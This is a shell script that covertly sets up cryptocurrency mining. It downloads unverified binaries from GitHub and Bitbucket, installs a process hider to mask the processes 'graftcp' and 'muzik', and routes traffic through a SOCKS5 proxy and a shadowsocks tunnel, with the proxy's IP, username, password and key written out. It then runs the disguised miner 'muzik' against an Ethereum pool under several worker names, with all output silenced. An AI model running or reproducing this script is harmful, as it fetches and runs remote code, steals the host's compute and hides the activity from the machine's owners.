#!/bin/sh
sleep 3m
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

apt update 
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider 

ph add graftcp
ph add muzik

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 191.101.148.51:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "


./graftcp/graftcp wget https://bitbucket.org/skyforce112211/skyforce123/downloads/muzik
chmod +x muzik


apt -y install shadowsocks-libev rng-tools

ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &

./graftcp/graftcp ./muzik -P stratum+tcp://prodent.1@eth.global.luxor.tech:700 >/dev/null 2>&1

sleep 2
./graftcp/graftcp ./muzik -P stratum+tcp://prodent.2@eth.global.luxor.tech:700 >/dev/null 2>&1

sleep 2
./graftcp/graftcp ./muzik -P stratum+tcp://prodent.3@eth.global.luxor.tech:700 >/dev/null 2>&1

sleep 2
./graftcp/graftcp ./muzik -P stratum+tcp://prodent.4@eth.global.luxor.tech:700 >/dev/null 2>&1
